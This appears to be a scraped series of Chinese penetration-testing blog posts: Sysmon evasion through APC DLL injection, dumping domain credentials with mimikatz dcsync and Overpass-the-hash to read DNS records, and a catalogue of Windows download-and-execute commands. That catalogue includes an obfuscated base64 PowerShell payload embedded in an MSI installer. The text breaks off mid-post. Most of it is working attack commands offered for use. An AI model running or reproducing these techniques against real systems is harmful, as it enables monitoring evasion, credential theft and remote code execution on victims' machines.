<h3 id="shellcode-injection-via-queueuserapc---hiding-from-sysmon">Shellcode Injection via QueueUserAPC - Hiding From Sysmon：</h3>

<p>c#实现，通过调用QueueUserAPC执行shellcode，可应用于InstallUtil.exe和Msbuild.exe，能够绕过Sysmon对Event ID 8: CreateRemoteThread的监控</p>

<p><strong>文章地址：</strong></p>

<p>http://subt0x10.blogspot.com/2017/01/shellcode-injection-via-queueuserapc.html</p>

<h2 id="0x02-sysmon简介">0x02 Sysmon简介</h2>
<hr>

<p><strong>下载地址：</strong></p>

<p>https://technet.microsoft.com/en-us/sysinternals/sysmon</p>

<p>以系统服务和驱动的方式安装在系统上</p>

<p>用来监控和记录系统活动，并记录到windows事件日志中</p>

<p>提供进程创建、网络连接以及文件创建时间更改等操作的详细信息</p>

<p>通过事件日志，可识别异常活动，了解攻击者在网络上的操作</p>

<p><strong>注：</strong></p>

<p>系统安装Sysmon后，新增服务Sysmon</p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/2-0.png" alt="Alt text"></p>

<p>也就是说，如果攻击者获得了主机权限，通过查看已安装服务可以看到Sysmon的安装</p>

<h3 id="安装">安装</h3>

<p>以默认配置安装：</p>

<p><code class="language-plaintext highlighter-rouge">sysmon -accepteula  –i -n</code></p>

<p>以配置文件安装：</p>

<p><code class="language-plaintext highlighter-rouge">sysmon -c config.xml</code></p>

<p>配置文件config.xml格式示例如下：</p>

<p><strong>注：</strong></p>

<p>xml大小写敏感</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Sysmon schemaversion="3.20"&gt;      
&lt;!-- Capture all hashes --&gt;      
&lt;HashAlgorithms&gt;*&lt;/HashAlgorithms&gt;      
&lt;EventFiltering&gt;        
&lt;!-- Log all drivers except if the signature --&gt;       
 &lt;!-- contains Microsoft or Windows --&gt;       
 &lt;DriverLoad onmatch="exclude"&gt;          
&lt;Signature condition="contains"&gt;microsoft&lt;/Signature&gt;         
 &lt;Signature condition="contains"&gt;windows&lt;/Signature&gt;        
&lt;/DriverLoad&gt;       
 &lt;!-- Do not log process termination --&gt;        
&lt;ProcessTerminate onmatch="include" /&gt;       
 &lt;!-- Log network connection if the destination port equal 443 --&gt;        
&lt;!-- or 80, and process isn't InternetExplorer --&gt;        
&lt;NetworkConnect onmatch="include"&gt;          
&lt;DestinationPort&gt;443&lt;/DestinationPort&gt;          
&lt;DestinationPort&gt;80&lt;/DestinationPort&gt;        
&lt;/NetworkConnect&gt;        
&lt;NetworkConnect onmatch="exclude"&gt;          
&lt;Image condition="end with"&gt;iexplore.exe&lt;/Image&gt;       
 &lt;/NetworkConnect&gt;     
 &lt;/EventFiltering&gt;    
&lt;/Sysmon&gt;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该示例引用自http://www.freebuf.com/sectool/122779.html</p>

<h3 id="查看配置">查看配置</h3>

<p><code class="language-plaintext highlighter-rouge">sysmon -c</code></p>

<p><strong>注：</strong></p>

<p>配置属性保存在注册表如下位置：</p>

<p><code class="language-plaintext highlighter-rouge">HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\SysmonDrv\Parameters</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/2-01.png" alt="Alt text"></p>

<h3 id="查看日志记录">查看日志记录</h3>

<p>1.通过面板</p>

<p>位置如下：</p>

<p><code class="language-plaintext highlighter-rouge">Control Panel\System and Security-View event logs</code></p>

<p><code class="language-plaintext highlighter-rouge">Applications and Services Logs-Microsoft-Windows-Sysmon-Operational</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/2-02.png" alt="Alt text"></p>

<p>2.通过powershell查看，命令如下：</p>

<p>(管理员权限)</p>

<p><code class="language-plaintext highlighter-rouge">Get-WinEvent -FilterHashtable @{logname="Microsoft-Windows-Sysmon/Operational";}</code></p>

<h3 id="监控并记录createremotethread">监控并记录CreateRemoteThread</h3>

<p>配置文件如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;Sysmon schemaversion="3.20"&gt;      
&lt;!-- Capture all hashes --&gt;      
&lt;HashAlgorithms&gt;*&lt;/HashAlgorithms&gt;      
 &lt;EventFiltering&gt;        
&lt;!-- Log all drivers except if the signature --&gt;       
 &lt;!-- contains Microsoft or Windows --&gt;       
&lt;CreateRemoteThread onmatch="include"&gt;
&lt;TargetImage condition="end with"&gt;calc.exe&lt;/TargetImage&gt;
&lt;/CreateRemoteThread&gt;
 &lt;/EventFiltering&gt;    
&lt;/Sysmon&gt;
</code></pre></div></div>

<p>保存为RecordCreateRemoteTh.xml</p>

<p><strong>注：</strong></p>

<p>该配置文件表示对进程calc.exe监控，如果捕获到CreateRemoteThread，将会写入事件日志</p>

<p>安装配置文件：</p>

<p><code class="language-plaintext highlighter-rouge">Sysmon.exe -c RecordCreateRemoteTh.xml</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/2-1.png" alt="Alt text"></p>

<p>查看配置信息</p>

<p><code class="language-plaintext highlighter-rouge">Sysmon.exe -c</code></p>

<p>如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/2-2.png" alt="Alt text"></p>

<p>启动calc.exe</p>

<p>执行CreateRemoteTh.exe，calc.exe被注入，弹框，如图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/2-3.png" alt="Alt text"></p>

<p>CreateRemoteTh.exe的源代码可参照：</p>

<p>https://github.com/3gstudent/CreateRemoteThread/blob/master/CreateRemoteThreadTest.cpp</p>

<p>查看日志，发现Event ID 8</p>

<p>如下图，检测到CreateRemoteThread</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/2-4.png" alt="Alt text"></p>

<p>通过powershell查看Event ID 8</p>

<p><code class="language-plaintext highlighter-rouge">Get-WinEvent -FilterHashtable @{logname="Microsoft-Windows-Sysmon/Operational";ID=8}</code></p>

<p>如下图，获取日志Event ID 8</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/2-5.png" alt="Alt text"></p>

<h2 id="0x03-c实现通过apc对dll注入">0x03 c++实现通过APC对Dll注入</h2>
<hr>

<p>使用APC注入：</p>

<p>代码如下：</p>

<p>https://github.com/3gstudent/Inject-dll-by-APC/blob/master/test.cpp</p>

<p>关于代码的详细说明可参照：</p>

<p>http://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/</p>

<p>如图，成功注入到calc.exe</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/3-1.png" alt="Alt text"></p>

<p>使用ProcessExplorer查看calc.exe加载的dll，如下图，成功注入testdll</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-4-6/3-2.png" alt="Alt text"></p>

<p>查看日志，并没有产生Event ID 8，成功绕过Sysmon对CreateRemoteThread的监控</p>

<h2 id="0x04-casey-smithsubtee分享的c实现代码和用途">0x04 Casey Smith@subTee分享的C#实现代码和用途</h2>
<hr>

<p>可应用到 InstallUtil.exe和Msbuild.exe的利用上面</p>

<p><strong>InstallUtil.exe：</strong></p>

<p>https://gist.github.com/subTee/7bbd8e995ed8e8b1f8dab1dc926def8a</p>

<p><strong>Msbuild.exe：</strong></p>

<p>https://gist.github.com/subTee/cf3e1b06cf58fcc9e0255190d30c2d38</p>

<p>调用过程中没有产生Event ID 8</p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文对Sysmon的监控功能做了测试，并介绍如何通过APC实现Dll注入，绕过Sysmon对CreateRemoteThread的监控</p>

<p>在特定环境下，如果无法手动关闭Sysmon服务，利用APC能在一定程度上绕过Sysmon对CreateRemoteThread的监控</p>

<p><strong>参考资料：</strong></p>

<p>http://subt0x10.blogspot.com/2017/01/shellcode-injection-via-queueuserapc.html</p>

<p>https://www.darkoperator.com/blog/2014/8/8/sysinternals-sysmon</p>

<p>http://www.freebuf.com/sectool/122779.html</p>

<p>http://www.cnblogs.com/uAreKongqi/p/6012353.html</p>

<p>http://blogs.microsoft.co.il/pavely/2017/03/14/injecting-a-dll-without-a-remote-thread/</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>

  </div>

  <div class="date">
    Written on April  6, 2017
  </div>

  
</article><article class="post">
  <h1>域渗透——DNS记录的获取</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在域渗透中，对域环境的信息搜集很关键，如果我们获得了域内管理员的权限，那么如何能够快速了解域内的网络架构呢？DNS记录无疑是一个很好的参考。</p>

<p>本文将要介绍在域渗透中，获得DNS管理员权限后，获取DNS记录的方法</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>通过DNS Manager获取DNS记录</li>
  <li>通过dnscmd获取DNS记录</li>
  <li>域内远程读取DNS记录的方法</li>
</ul>

<h2 id="0x02-通过dns-manager获取dns记录">0x02 通过DNS Manager获取DNS记录</h2>
<hr>

<p>测试系统：</p>

<p>Windows Server 2008 R2 x64</p>

<p>选择<code class="language-plaintext highlighter-rouge">Administrative Tools</code> -&gt; <code class="language-plaintext highlighter-rouge">DNS</code></p>

<p>在<code class="language-plaintext highlighter-rouge">Forward Lookup Zones</code>下找到当前域名，能够显示当前域内的DNS记录，包括主机名和对应的IP</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/2-1.png" alt="Alt text"></p>

<h2 id="0x03-通过dnscmd获取dns记录">0x03 通过dnscmd获取DNS记录</h2>
<hr>

<p>dnscmd：</p>

<p>用来管理DNS服务器的命令行接口，支持远程连接</p>

<p>默认安装的系统：</p>

<ul>
  <li>Windows Server 2003</li>
  <li>Windows Server 2008</li>
  <li>Windows Server 2003 R2</li>
  <li>Windows Server 2008 R2</li>
  <li>Windows Server 2012</li>
  <li>Windows Server 2003 with SP1</li>
  <li>…</li>
</ul>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/cc772069(v=ws.11)</p>

<p>Win7系统在使用时需要安装Remote Server Administration Tools (RSAT)</p>

<p>参考地址：</p>

<p>https://support.microsoft.com/en-us/help/2693643/remote-server-administration-tools-rsat-for-windows-operating-systems</p>

<p>RSAT下载地址：</p>

<p>https://www.microsoft.com/en-us/download/details.aspx?id=7887</p>

<p>测试系统：</p>

<p>Windows Server 2008 R2 x64</p>

<p>常用命令:</p>

<h4 id="1列出dns区域中当前节点的资源记录">(1)列出DNS区域中当前节点的资源记录：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /EnumZones
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-1.png" alt="Alt text"></p>

<h4 id="2列出testcom的信息">(2)列出test.com的信息：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /ZoneInfo test.com
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-2.png" alt="Alt text"></p>

<h4 id="3列举testcom中的记录方法1更详细">(3)列举test.com中的记录，方法1(更详细)：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /ZonePrint test.com
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-3.png" alt="Alt text"></p>

<h4 id="4列举testccom的记录方法2">(4)列举testc.com的记录，方法2：</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd . /EnumRecords test.com .
</code></pre></div></div>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/3-4.png" alt="Alt text"></p>

<p>结果同DNS Manager获取的记录一致</p>

<h2 id="0x04-域内远程读取dns记录的方法">0x04 域内远程读取DNS记录的方法</h2>
<hr>

<h3 id="方法分析">方法分析</h3>

<p>前提需要获得域管理员的权限</p>

<p>第一种方法是先远程连接域控制器，然后在域控制器上执行dnscmd获取DNS记录</p>

<p>第二种方法是在域内一台主机上面，执行dnscmd远程读取DNS记录</p>

<p>但是Win7系统默认不支持dnscmd，直接安装Remote Server Administration Tools (RSAT)也不现实</p>

<p>于是，我尝试寻找在未安装Remote Server Administration Tools (RSAT)的系统上执行dnscmd的方法</p>

<h3 id="方法测试">方法测试</h3>

<p>向未安装Remote Server Administration Tools (RSAT)的Win7系统上复制一个dnscmd.exe，直接执行，结果失败</p>

<h3 id="解决方法">解决方法</h3>

<p>通过Process Monitor记录dnscmd的执行过程，查看缺少哪些文件</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/4-1.png" alt="Alt text"></p>

<p>发现缺少文件dnscmd.exe.mui</p>

<p>补全缺少的文件，再次测试，最终找到解决方法</p>

<p>在未安装Remote Server Administration Tools (RSAT)的系统上执行dnscmd，需要满足以下条件：</p>

<ol>
  <li>dnscmd保存在路径<code class="language-plaintext highlighter-rouge">C:\Windows\System32</code>下</li>
  <li>dnscmd.exe.mui保存在<code class="language-plaintext highlighter-rouge">C:\Windows\System32\en-US</code>下(该位置比较通用，也可以在其他位置)</li>
</ol>

<p><strong>注：</strong></p>

<p>dnscmd和dnscmd.exe.mui使用Windows Server 2008 R2下的即可</p>

<p>这里提供一个测试文件(我从Windows Server 2008 R2下获得的)：</p>

<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe</p>

<p>https://github.com/3gstudent/test/blob/master/dnscmd.exe.mui</p>

<p><strong>注：</strong></p>

<p>仅供测试</p>

<p>由于dnscmd在远程连接时，未提供输入用户名和口令的接口，这里需要借助mimikatz的Overpass-the-hash</p>

<p>首先需要获得域管理员用户的hash，这里只能用ntlm/rc4/aes128/aes256</p>

<p>如果获得了域管理员用户的明文口令，可以先将明文转为ntlm，在线加密的网站：</p>

<p>https://md5decrypt.net/en/Ntlm/</p>

<p>补充：使用dcsync获得域内所有用户hash的方法</p>

<p>域控制器上执行mimikatz:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "lsadump::dcsync /domain:test.local /all /csv exit"
</code></pre></div></div>

<h3 id="实际测试">实际测试</h3>

<p>测试环境的参数如下：</p>

<ul>
  <li>域管理员用户：Administrator</li>
  <li>口令：DomainAdmin456!</li>
  <li>hash：A55E0720F0041193632A58E007624B40</li>
</ul>

<p>Overpass-the-hash:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40"
</code></pre></div></div>

<p>这样会弹出一个cmd.exe</p>

<p>接着使用dnscmd远程连接进行查询：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd WIN-F08C969D7FM.test.com /EnumZones
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd WIN-F08C969D7FM /EnumZones
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>这里要使用FQDN或者计算机名</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2019-2-22/4-2.png" alt="Alt text"></p>

<p>如果想在命令行下实现整个流程，可以采用如下方法：</p>

<p>新建<code class="language-plaintext highlighter-rouge">c:\test\1.bat</code>，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Dnscmd WIN-F08C969D7FM.test.com /EnumZones &gt; c:\test\out.txt
</code></pre></div></div>

<p>Overpass-the-hash:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mimikatz.exe privilege::debug "sekurlsa::pth /user:Administrator /domain:test.com /ntlm:A55E0720F0041193632A58E007624B40 /run:\"cmd.exe /c c:\test\1.bat\""
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>cmd.exe下<code class="language-plaintext highlighter-rouge">"</code>需要使用转义字符<code class="language-plaintext highlighter-rouge">\"</code></p>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文介绍了在域内使用Overpass-the-hash实现dnscmd远程读取DNS记录的方法</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on February 22, 2019
  </div>

  
</article><article class="post">
  <h1>渗透技巧——从github下载文件的多种方法</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>本文源于一个有趣的问题：</p>

<p>已知exe文件：https://github.com/3gstudent/test/raw/master/putty.exe</p>

<p>Windows环境，需要将该exe释放到指定目录并执行，例如<code class="language-plaintext highlighter-rouge">c:\download</code></p>

<p><strong>问：</strong><code class="language-plaintext highlighter-rouge">通过cmd实现的最短代码是多少字符？</code></p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>通过cmd实现从github下载文件的方法汇总</li>
  <li>选出最短代码的实现方法</li>
</ul>

<h2 id="0x02-分析">0x02 分析</h2>
<hr>

<p>在之前的文章《渗透技巧——通过cmd上传文件的N种方法》对通过命令行下载文件的方法做了汇总</p>

<p>而github支持https协议，并不支持http协议，所以在利用上需要注意一些问题，有些方法不支持http协议</p>

<h2 id="0x03-可用方法汇总">0x03 可用方法汇总</h2>
<hr>

<h3 id="1powershell">1、powershell</h3>

<p><code class="language-plaintext highlighter-rouge">powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\download\a.exe');start-process 'c:\download\a.exe'</code></p>

<h3 id="2certutil">2、certutil</h3>

<p><code class="language-plaintext highlighter-rouge">certutil -urlcache -split -f https://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe&amp;&amp;c:\download\a.exe</code></p>

<h3 id="3bitsadmin">3、bitsadmin</h3>

<p><code class="language-plaintext highlighter-rouge">bitsadmin /transfer n http://github.com/3gstudent/test/raw/master/putty.exe c:\download\a.exe &amp;&amp; c:\download\a.exe</code></p>

<p><strong>注：</strong></p>

<p>使用bitsadmin的下载速度较慢</p>

<h3 id="4regsvr32">4、regsvr32</h3>

<p><code class="language-plaintext highlighter-rouge">regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec.sct scrobj.dll</code></p>

<p><strong>原理：</strong></p>

<p>regsve32-&gt;JScript-&gt;powershell-&gt;download&amp;exec</p>

<p>JScript调用powershell实现下载执行的代码为：</p>

<p><code class="language-plaintext highlighter-rouge">new ActiveXObject("WScript.Shell").Run("powershell (new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\\download\\a.exe');start-process 'c:\\download\\a.exe'",0,true);</code></p>

<p>参照sct文件格式：</p>

<p>https://raw.githubusercontent.com/3gstudent/SCTPersistence/master/calc.sct</p>

<p>添加功能，生成downloadexec.sct</p>

<p><strong>实现功能：</strong></p>

<p><code class="language-plaintext highlighter-rouge">regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec.sct scrobj.dll</code></p>

<p>当然，为了减少调用的程序，也可以使用以下思路：</p>

<p>regsve32-&gt;VBScript-&gt;download&amp;exec</p>

<p>通常，vbs脚本实现的下载执行代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim http,ado
Set http = CreateObject("Msxml2.XMLHTTP")
http.open "GET","http://192.168.81.192/putty.exe",False
http.send
Set ado = createobject("Adodb.Stream")
ado.Type = adTypeBinary
ado.Open
ado.Write http.responseBody
ado.SaveToFile "c:\download\a.exe"
ado.Close
</code></pre></div></div>

<p>但该脚本不支持https下载，可以换用<code class="language-plaintext highlighter-rouge">Msxml2.ServerXMLHTTP.6.0</code></p>

<p>代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim http,ado
Set http = CreateObject("Msxml2.ServerXMLHTTP.6.0")
http.SetOption 2, 13056
http.open "GET","https://github.com/3gstudent/test/raw/master/putty.exe",False
http.send
Set ado = createobject("Adodb.Stream")
ado.Type = adTypeBinary
ado.Open
ado.Write http.responseBody
ado.SaveToFile "c:\download\a.exe"
ado.Close
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该思路来自@mosin @索马里海贼</p>

<p>也可以通过<code class="language-plaintext highlighter-rouge">WinHttp.WinHttpRequest.5.1</code>实现，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Const adTypeBinary = 1
Const adSaveCreateOverWrite = 2
Dim http,ado
Set http = CreateObject("WinHttp.WinHttpRequest.5.1")
http.open "GET","https://github.com/3gstudent/test/raw/master/putty.exe",False
http.send
Set ado = createobject("Adodb.Stream")
ado.Type = adTypeBinary
ado.Open
ado.Write http.responseBody
ado.SaveToFile "c:\download\a.exe"
ado.Close
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该思路来自@ogre</p>

<p>vbs脚本实现的执行代码</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>WScript.CreateObject("WScript.Shell").Run "c:\download\a.exe",0,true 
</code></pre></div></div>

<p>依旧是以sct文件作为模板，添加功能，生成downloadexec2.sct</p>

<p><strong>实现功能：</strong></p>

<p><code class="language-plaintext highlighter-rouge">regsvr32 /u /s /i:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec2.sct scrobj.dll</code></p>

<h3 id="5pubprnvbs">5、pubprn.vbs</h3>

<p>利用pubprn.vbs能够执行远程服务器上的sct文件(sct文件格式有区别)</p>

<p><strong>思路：</strong></p>

<p>regsve32-&gt;VBScript-&gt;download&amp;exec</p>

<p>代码已上传，地址为https://raw.githubusercontent.com/3gstudent/test/master/downloadexec3.sct</p>

<p><strong>实现功能：</strong></p>

<p><code class="language-plaintext highlighter-rouge">cscript /b C:\Windows\System32\Printing_Admin_Scripts\zh-CN\pubprn.vbs 127.0.0.1 script:https://raw.githubusercontent.com/3gstudent/test/master/downloadexec3.sct</code></p>

<p>当然，也可使用如下思路实现(代码略)：</p>

<p>regsve32-&gt;JScript-&gt;powershell-&gt;download&amp;exec</p>

<h3 id="6msiexec">6、msiexec</h3>

<p>该方法我之前的两篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E4%B8%AD%E7%9A%84msiexec/">《渗透测试中的msiexec》</a><a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E4%BB%8EAdmin%E6%9D%83%E9%99%90%E5%88%87%E6%8D%A2%E5%88%B0System%E6%9D%83%E9%99%90/">《渗透技巧——从Admin权限切换到System权限》</a>有过介绍，细节不再赘述</p>

<p>首先将powershell实现下载执行的代码作base64编码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$fileContent = "(new-object System.Net.WebClient).DownloadFile('https://github.com/3gstudent/test/raw/master/putty.exe','c:\download\a.exe');start-process 'c:\download\a.exe'"
$bytes  = [System.Text.Encoding]::Unicode.GetBytes($fileContent);
$encoded = [System.Convert]::ToBase64String($bytes); 
$encoded
</code></pre></div></div>

<p>得到：</p>

<p><code class="language-plaintext highlighter-rouge">KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</code></p>

<p>完整powershell命令为：</p>

<p><code class="language-plaintext highlighter-rouge">powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==</code></p>

<p>完整wix文件为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;?xml version="1.0"?&gt;
&lt;Wix xmlns="http://schemas.microsoft.com/wix/2006/wi"&gt;
  &lt;Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product 
Name" Version="0.0.1" Manufacturer="@_xpn_" Language="1033"&gt;
    &lt;Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/&gt;
    &lt;Media Id="1" /&gt;

    &lt;Directory Id="TARGETDIR" Name="SourceDir"&gt;
      &lt;Directory Id="ProgramFilesFolder"&gt;
        &lt;Directory Id="INSTALLLOCATION" Name="Example"&gt;
          &lt;Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222"&gt;     
          &lt;/Component&gt;
        &lt;/Directory&gt;
      &lt;/Directory&gt;
    &lt;/Directory&gt;

    &lt;Feature Id="DefaultFeature" Level="1"&gt;
      &lt;ComponentRef Id="ApplicationFiles"/&gt;
    &lt;/Feature&gt;

    &lt;Property Id="cmdline"&gt;powershell -WindowStyle Hidden -enc KABuAGUAdwAtAG8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACcAaAB0AHQAcABzADoALwAvAGcAaQB0AGgAdQBiAC4AYwBvAG0ALwAzAGcAcwB0AHUAZABlAG4AdAAvAHQAZQBzAHQALwByAGEAdwAvAG0AYQBzAHQAZQByAC8AcAB1AHQAdAB5AC4AZQB4AGUAJwAsACcAYwA6AFwAZABvAHcAbgBsAG8AYQBkAFwAYQAuAGUAeABlACcAKQA7AHMAdABhAHIAdAAtAHAAcgBvAGMAZQBzAHMAIAAnAGMAOgBcAGQAbwB3AG4AbABvAGEAZABcAGEALgBlAHgAZQAnAA==
    &lt;/Property&gt;

    &lt;CustomAction Id="SystemShell" Execute="deferred" Directory="TARGETDIR" 
ExeCommand='[cmdline]' Return="ignore" Impersonate="no"/&gt;

    &lt;CustomAction Id="FailInstall" Execute="deferred" Script="vbscript" Return="check"&gt;
      invalid vbs to fail install
    &lt;/CustomAction&gt;

    &lt;InstallExecuteSequence&gt;
      &lt;Custom Action="SystemShell" After="InstallInitialize"&gt;&lt;/Custom&gt;
      &lt;Custom Action="FailInstall" Before="InstallFiles"&gt;&lt;/Custom&gt;
    &lt;/InstallExecuteSequence&gt;

  &lt;/Product&gt;
&lt;/Wix&gt;
</code></pre></div></div>

<p>将其编译，生成msi文件，命令如下：</p>

<p><code class="language-plaintext highlighter-rouge">candle.exe msigen.wix</code></p>

<p><code class="language-plaintext highlighter-rouge">light.exe msigen.wixobj</code></p>

<p>生成test.msi</p>

<p><strong>实现功能：</strong></p>

<p><code class="language-plaintext highlighter-rouge">msiexec /q /i https://github.com/3gstudent/test/raw/master/test.msi</code></p>

<p><strong>注：</strong></p>

<p>执行后需要手动结束进程msiexec.exe</p>

<h3 id="7mshta">7、mshta</h3>

<p>mshta支持<code class="language-plaintext highlighter-rouge">http</code>和<code class="language-plaintext highlighter-rouge">htpps</code></p>

<p>但mshta在执行hta脚本时，类似于浏览器，会根据链接返回头进行对应的解析操作，所以这里只有当返回头为html时才会运行</p>

<p>否则会被当普通文本进行解析</p>

<p>对于github的代码，返回的格式为<code class="language-plaintext highlighter-rouge">text/plain</code></p>

<p>如果使用如下命令执行：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mshta https://raw.githubusercontent.com/3gstudent/test/master/calc.hta
</code></pre></div></div>

<p>会把代码当成<code class="language-plaintext highlighter-rouge">text</code>，无法解析成html，导致脚本无法执行</p>

<p>但是我们可以换一个思路：</p>

<p><code class="language-plaintext highlighter-rouge">将hta文件传到github的博客下面，就能够被解析成html，实现代码执行</code></p>

<p>将hta文件上传至github博客下面，地址为https://3gstudent.github.io/test/calc.hta</p>

<p>执行如下命令：</p>

